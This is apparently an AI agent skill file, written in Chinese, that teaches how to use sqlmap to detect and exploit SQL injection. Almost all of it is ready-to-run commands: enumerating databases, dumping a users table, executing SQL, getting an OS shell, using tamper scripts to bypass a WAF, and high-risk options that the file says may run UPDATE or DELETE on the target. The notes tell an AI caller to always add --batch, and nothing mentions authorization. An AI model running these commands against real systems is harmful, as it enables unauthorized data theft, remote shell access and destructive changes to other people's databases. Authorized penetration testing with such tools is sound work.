---
name: sqlmap
description: 当需要检测和利用 SQL 注入漏洞时使用
---

## 工具

```bash
sqlmap -u "https://example.com/api?id=1"
```

## 常用参数

```bash
# 检测注入点
sqlmap -u "https://example.com/page?id=1"

//指定参数检测（只测 id 参数）
sqlmap -u "https://example.com/page?id=1" -p id

//POST 请求检测
sqlmap -u "https://example.com/login" --data="user=admin&pass=123"

//从文件读取请求（Burp 抓包导出）
sqlmap -r request.txt

//带 Cookie
sqlmap -u "https://example.com/page?id=1" --cookie="session=abc123"

//带 Header
sqlmap -u "https://example.com/api/data" -H="Authorization: Bearer xxx"

//获取数据库信息
sqlmap -u "https://example.com/page?id=1" --dbs

//获取表
sqlmap -u "https://example.com/page?id=1" -D dbname --tables

//获取列
sqlmap -u "https://example.com/page?id=1" -D dbname -T users --columns

//导出数据
sqlmap -u "https://example.com/page?id=1" -D dbname -T users --dump

//执行 SQL 语句
sqlmap -u "https://example.com/page?id=1" --sql-query="SELECT version()"

//获取 shell（os-shell，需要 DBA 权限）
sqlmap -u "https://example.com/page?id=1" --os-shell

//指定注入技术（默认全部尝试）
# B=Boolean, E=Error, U=Union, S=Stacked, T=Time, Q=Query
sqlmap -u "https://example.com/page?id=1" --technique=BEUSTQ

//风险等级和级别
sqlmap -u "https://example.com/page?id=1" --risk=3 --level=5
```

## 典型流程

```bash
# 1. 检测注入点
sqlmap -u "https://example.com/page?id=1" --batch

# 2. 发现注入后，获取数据库
sqlmap -u "https://example.com/page?id=1" --dbs --batch

# 3. 获取目标表
sqlmap -u "https://example.com/page?id=1" -D mydb --tables --batch

# 4. 导出数据
sqlmap -u "https://example.com/page?id=1" -D mydb -T users --dump --batch

# 5. 尝试 os-shell
sqlmap -u "https://example.com/page?id=1" --os-shell --batch
```

## 注意事项

- `--batch` 使用默认选项，不交互确认，AI 调用时必须加
- `--risk=3` 会测试更多 payload，但可能对目标造成影响（UPDATE/DELETE 注入）
- `--level=5` 测试 HTTP 头（Cookie/User-Agent/Referer），默认只测 1-2 级
- 检测到注入后先 `--dbs` 看有哪些库，再逐步深入
- `--tamper` 可以绕过 WAF，如 `--tamper=space2comment,between`
- 大量数据导出用 `--start=0 --stop=100` 分页
- 结果保存在 `~/.local/share/sqlmap/output/` 下
